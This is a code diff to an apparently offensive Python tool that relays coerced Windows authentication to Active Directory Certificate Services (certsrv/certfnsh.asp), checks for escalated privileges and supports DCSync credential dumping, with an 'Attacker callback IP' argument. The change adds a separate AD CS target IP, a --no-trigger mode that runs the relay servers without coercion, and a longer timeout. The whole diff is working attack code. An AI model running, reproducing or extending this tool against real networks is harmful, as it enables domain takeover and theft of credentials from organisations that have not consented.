@@ -50,7 +50,7 @@ def banner():
 
 
 
-def startServers(userDomain, userName, password, address, kdc, callback, options):
+def startServers(userDomain, userName, password, address, kdc, adcs, callback, options):
     global start
     start = time.time()
     logging.info("Current attack method is ==> {}".format(options.method.upper()))
@@ -82,9 +82,9 @@ def startServers(userDomain, userName, password, address, kdc, callback, options
         c.aclattack = False
     else:
         if options.ssl:
-            target = "https://"+target_dc+"/certsrv/certfnsh.asp"
+            target = "https://"+adcs+"/certsrv/certfnsh.asp"
         else:
-            target = "http://"+target_dc+"/certsrv/certfnsh.asp"
+            target = "http://"+adcs+"/certsrv/certfnsh.asp"
         c.setTargets(TargetsProcessor(singleTarget=str(target), protocolClients=PROTOCOL_CLIENTS))
         c.setIsADCSAttack(kdc)
         c.setADCSOptions(options.template)
@@ -103,7 +103,10 @@ def startServers(userDomain, userName, password, address, kdc, callback, options
     s.start()
     logging.info("Relay servers started, waiting for connection....")
     try:
-        status = exploit(userDomain, userName, password, address, kdc, callback, options)
+        if not options.no_trigger:
+            status = exploit(userDomain, userName, password, address, kdc, callback, options)
+        else:
+            status = True
         if status:
             exp = Thread(target=checkauth, args=(userDomain, userName, password, address, kdc, callback, options,))
             exp.daemon = True
@@ -131,7 +134,6 @@ def checkauth(userDomain, userName, password, address, kdc, callback, options):
     getpriv = config.get_priv()
     dcync = config.get_dcsync()
     pki = config.get_pki()
-    logging.info("Checking privs...")
     while True:
         if getpriv == True:
             if dcync:
@@ -267,7 +269,7 @@ def check_adcs(url,options):
         if resp.status_code == 401:
             return True
     except Exception as e:
-        logging.error("AD CS not found! Pls change DC ip to PDC.")
+        logging.error("AD CS not found! Pls set up ADCS IP.")
     return False
     
 
@@ -278,9 +280,10 @@ def main():
                                                        ' (if you want to parse local files)')
 
     parser.add_argument("-r","--callback-ip", required=True, help="Attacker callback IP")
-    parser.add_argument("--timeout", default='30',type=int, help='timeout in seconds')
+    parser.add_argument("--timeout", default='120',type=int, help='timeout in seconds')
     parser.add_argument("--debug", action='store_true',help='Enable debug output')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
+    parser.add_argument('--no-trigger', action='store_true', help='Start exploit server without trigger.')
 
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='Hash for account auth (instead of password)')
@@ -288,6 +291,8 @@ def main():
     
     group = parser.add_argument_group('connection')
     group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP address of the Domain Controller')
+    group.add_argument('-adcs-ip', action='store', metavar="ip address",
+                       help='IP Address of the ADCS, if unspecified, dc ip will be used')
     group.add_argument("--ldap", action='store_true', help='Use ldap.')
     group.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
@@ -346,6 +351,11 @@ def main():
         logging.info("If your target is not DC, pls set up dc-ip.")
         kdc = address
 
+    if options.adcs_ip:
+        adcs = options.adcs_ip
+    else:
+        adcs = kdc
+
     if password == '' and userName != '' and options.hashes is None:
         from getpass import getpass
         password = getpass("Password:")
@@ -355,7 +365,7 @@ def main():
     
     callback = options.callback_ip
     if options.method == "pki":
-        ads = check_adcs(kdc,options)
+        ads = check_adcs(adcs,options)
         if not ads:
             sys.exit(0)
         if options.pfx_pass == "Rand":
@@ -363,7 +373,7 @@ def main():
         else:
             setpass = options.pfx_pass
         config.set_pass(setpass)
-    startServers(userDomain, userName, password, address, kdc, callback, options)
+    startServers(userDomain, userName, password, address, kdc, adcs, callback, options)
 
 if __name__ == '__main__':
     banner()
